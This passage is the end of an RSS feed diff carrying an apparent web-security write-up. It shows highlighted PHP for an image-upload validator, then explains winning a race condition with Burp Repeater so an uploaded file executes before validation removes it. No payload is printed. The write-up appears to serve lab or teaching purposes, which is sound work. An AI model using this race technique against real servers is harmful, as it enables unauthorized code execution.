+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;http_response_code&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkViruses&lt;/span&gt;($fileName) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// checking for viruses
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkFileType&lt;/span&gt;($fileName) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $imageFileType &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strtolower&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pathinfo&lt;/span&gt;($fileName,&lt;span style=&#34;color:#a6e22e&#34;&gt;PATHINFO_EXTENSION&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($imageFileType &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $imageFileType &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sorry, only JPG &amp;amp; PNG files are allowed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;We can use burp repeater to send both requests in a single packet.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-12.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Sometimes, it’ll not execute the file at first, but we can keep trying the attack in order to eventually have the second request hitting the server before the validation happens, while the file is still in the uploads directory.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-13.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-14.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
